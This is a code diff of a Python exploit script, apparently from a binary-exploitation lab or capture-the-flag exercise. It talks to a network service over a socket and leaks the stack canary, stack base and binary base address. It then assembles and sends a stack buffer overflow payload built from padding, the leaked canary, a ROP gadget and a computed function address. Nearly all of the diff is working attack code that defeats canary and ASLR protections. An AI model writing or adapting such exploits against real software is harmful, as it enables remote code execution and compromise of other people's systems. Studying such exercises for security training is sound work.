@@ -34,9 +34,11 @@ try:
         print(hex_canary)
         canary_byte_array = bytearray.fromhex(hex_canary[2:])
         canary_byte_array.reverse()
-        desired_canary = b"\x00\x33\x3c\x84\x0f\x1c\xd6\xa0"
-        if desired_canary != canary_byte_array:
-            print("CANARY ARRAYS DON'T MATCH")
+        desired_canary = b"\x00\xa9\x2b\xcc\x5d\x61\x73\x36"
+        if desired_canary == canary_byte_array:
+            print("CANARY ARRAYS MATCH")
+        else:
+            print("CANARY ARRAYS DO NOT MATCH")
 
     # Send data for stack base
     message = b'\n6\n'
@@ -51,24 +53,56 @@ try:
         stack_base = (hex(int.from_bytes(data,"little")-224))
         print("Stack base read in as:")
         print(stack_base)
-        sbase_byte_array = bytearray.fromhex(hex_canary[2:])
+        sbase_byte_array = bytearray.fromhex(stack_base[2:])
         sbase_byte_array.reverse()
+
+    # Send data for binary base addr
+    message = b'\n280\n'
+    print('sending {!r}'.format(message))
+    sock.sendall(message)
+
+    amount_received = 0
+    amount_expected = len(message)
+    while amount_received < amount_expected:
+        data = sock.recv(280)
+        amount_received += len(data)
+        binary_base = hex(int.from_bytes(data[272:],"little"))
+        print("Binary base read in as:")
+        print(binary_base)
+        bbase_byte_array = bytearray.fromhex(binary_base[2:])
+        bbase_byte_array.reverse()
 
 # exploit will consist of argstr + overflow + canary + gadget + argaddr + funcaddr
 
-    argstr = "pawned!"
-    overflow1 = "A" * (24 - len(argstr)) # check numbers on this
+    argstr = b"pawned!"
+    overflow1 = b"A" * (24 - len(argstr)) # check numbers on this
     # canary_byte_array defined on first request
     # sbase_byte_array defined on second request
-    overflow2 = "A" * 1 # check numbers on this
-    gadget = "\x33\x0f\x00\x00\x00\x00\x00\x00" # doesnt change b/c instruction addr, not mem addr?
-    argaddr = "" #changes w aslr, addr we start overflowing
-    funcaddr = "" #changes w alsr
+    overflow2 = b"A" * 1 # check numbers on this
+    gadget = b"\x33\x0f\x00\x00\x00\x00\x00\x00" # doesnt change b/c instruction addr, not mem addr?
+    argaddr = sbase_byte_array
+    
+    funcaddr = hex(int(binary_base, 16) + 0xaea)
+    faddr_byte_array = bytearray.fromhex(funcaddr[2:])
+    faddr_byte_array.reverse()
 
-    exploit = argstr + overflow1 + canary + overflow2  + gadget + argaddr + funcaddr
+    print("funcaddr is:")
+    print(funcaddr)
 
+    exploit = argstr + overflow1 + canary_byte_array  + gadget + argaddr + faddr_byte_array
+    print("Canary_byte_array before sent:")
+    print(canary_byte_array)
+
+    print("gadget:")
+    print(gadget)
+
+    print("argaddr:")
+    print(argaddr)
+
+    print("faddr_byte_array")
+    print(faddr_byte_array)
 # Send data
-    message = b"" # correct exploit message
+    message = exploit # correct exploit message
     print('sending {!r}'.format(message))
     sock.sendall(message)
 
@@ -78,6 +112,7 @@ try:
     while amount_received < amount_expected:
         data = sock.recv(32)
         amount_received += len(data)
+        print("Got to end")
         # if exploit sucessfully makes server exit won't need to print anyhthing anyway
 
 finally:
